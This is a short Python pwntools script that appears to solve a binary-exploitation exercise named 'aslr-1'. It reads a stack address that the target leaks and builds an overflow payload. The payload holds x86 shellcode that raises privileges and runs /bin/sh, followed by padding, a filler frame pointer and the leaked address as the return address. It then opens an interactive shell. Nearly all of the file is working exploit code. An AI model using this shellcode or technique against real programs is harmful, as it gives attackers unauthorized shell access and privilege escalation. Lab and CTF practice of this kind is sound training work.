#!/usr/bin/env python

from pwn import *

p = process("./aslr-1")

# context.terminal = ['tmux', 'splitw', '-v']
# gdb.attach(p, 'b input_func+70')

# nop = '\x90' * 200
sh = "j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xc91\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80"
buf = "A" * (0x88 - len(sh))
# sh_addr = p32(0xbf8d1ad0)

# c = Core('core')
# sh_addr = c.stack.find(sh)
# sh_addr = p32(sh_addr)

p.recvuntil("at ")
leak = p.recvline(timeout = 1)
# 0 indicates base 16
print("leak is " + leak)
leak = int(leak, 0)
leak = p32(leak)

atk = sh
atk += buf
atk += "BBBB"
atk += leak

p.sendline(atk)

p.interactive()
